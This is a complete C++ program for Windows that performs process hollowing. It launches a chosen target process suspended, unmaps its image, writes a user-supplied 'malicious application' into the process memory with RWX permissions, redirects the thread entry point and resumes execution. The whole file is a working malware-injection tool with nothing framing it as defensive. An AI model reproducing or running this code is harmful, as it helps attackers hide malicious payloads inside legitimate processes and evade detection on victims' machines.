#include <Windows.h>
#include <iostream>
#include <string>
#include <iomanip> 
#pragma comment(lib, "ntdll.lib")

using namespace std;

typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);

void LogHex(const string& message, PVOID value) {
    cout << "[+] " << message << " : 0x" << hex << uppercase << (uintptr_t)value << nouppercase << dec << endl;
}

int main() {
    string target, maliciousApp;
    cout << "Enter the path of the target process: ";
    getline(cin, target);
    cout << "Enter the path of the malicious application: ";
    getline(cin, maliciousApp);

    LPSTARTUPINFOA target_si = new STARTUPINFOA();
    LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION();
    CONTEXT c;

    if (!CreateProcessA(
        target.c_str(),
        NULL,
        NULL,
        NULL,
        TRUE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        target_si,
        target_pi)) {
        cerr << "[!] Failed to create the target process. Error: " << GetLastError() << endl;
        return 1;
    }

    LogHex("Target Process PEB", (PVOID)(target_pi->hProcess));

    HANDLE hMaliciousCode = CreateFileA(
        maliciousApp.c_str(),
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL);

    if (hMaliciousCode == INVALID_HANDLE_VALUE) {
        cerr << "[!] Failed to open the malicious application. Error: " << GetLastError() << endl;
        TerminateProcess(target_pi->hProcess, 0);
        return 1;
    }

    DWORD maliciousFileSize = GetFileSize(hMaliciousCode, NULL);
    PVOID pMaliciousImage = VirtualAlloc(NULL, maliciousFileSize, 0x3000, 0x04);
    DWORD numberOfBytesRead;

    if (!ReadFile(hMaliciousCode, pMaliciousImage, maliciousFileSize, &numberOfBytesRead, NULL)) {
        cerr << "[!] Failed to read the malicious application into memory. Error: " << GetLastError() << endl;
        TerminateProcess(target_pi->hProcess, 0);
        return 1;
    }

    CloseHandle(hMaliciousCode);

    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage;
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew);

    cout << "[+] The PE file is valid." << endl;
    LogHex("Source PE Image architecture", (PVOID)pNTHeaders->FileHeader.Machine);

    c.ContextFlags = CONTEXT_FULL;
    GetThreadContext(target_pi->hThread, &c);

    PVOID pTargetImageBaseAddress;
    ReadProcessMemory(
        target_pi->hProcess,
        (PVOID)(c.Rdx + 0x10),
        &pTargetImageBaseAddress,
        sizeof(PVOID),
        0);

    LogHex("Target Process Image Base", pTargetImageBaseAddress);

    HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll");
    pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hNtdllBase, "ZwUnmapViewOfSection");

    DWORD dwResult = pZwUnmapViewOfSection(target_pi->hProcess, pTargetImageBaseAddress);
    if (dwResult) {
        cerr << "[!] Failed to unmap the section. Error: " << dwResult << endl;
        TerminateProcess(target_pi->hProcess, 0);
        return 1;
    }

    LogHex("Memory allocate at", pTargetImageBaseAddress);

    DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage;

    PVOID pHollowAddress = VirtualAllocEx(
        target_pi->hProcess,
        pTargetImageBaseAddress,
        sizeOfMaliciousImage,
        0x3000,
        0x40);

    if (!pHollowAddress) {
        cerr << "[!] Failed to allocate memory in the target process. Error: " << GetLastError() << endl;
        TerminateProcess(target_pi->hProcess, 0);
        return 1;
    }

    LogHex("Headers write at", pTargetImageBaseAddress);

    if (!WriteProcessMemory(
        target_pi->hProcess,
        pTargetImageBaseAddress,
        pMaliciousImage,
        pNTHeaders->OptionalHeader.SizeOfHeaders,
        NULL)) {
        cerr << "[!] Failed to write the PE headers. Error: " << GetLastError() << endl;
        TerminateProcess(target_pi->hProcess, 0);
        return 1;
    }

    for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

        cout << "[+] Section " << pSectionHeader->Name << " write at : ";
        LogHex("", (PVOID)((LPBYTE)pTargetImageBaseAddress + pSectionHeader->VirtualAddress));

        WriteProcessMemory(
            target_pi->hProcess,
            (PVOID)((LPBYTE)pTargetImageBaseAddress + pSectionHeader->VirtualAddress),
            (PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData),
            pSectionHeader->SizeOfRawData,
            NULL);
    }

    c.Rcx = (SIZE_T)((LPBYTE)pTargetImageBaseAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint);

    SetThreadContext(target_pi->hThread, &c);
    ResumeThread(target_pi->hThread);

    cout << "[+] The injection has succeeded!" << endl;

    return 0;
}
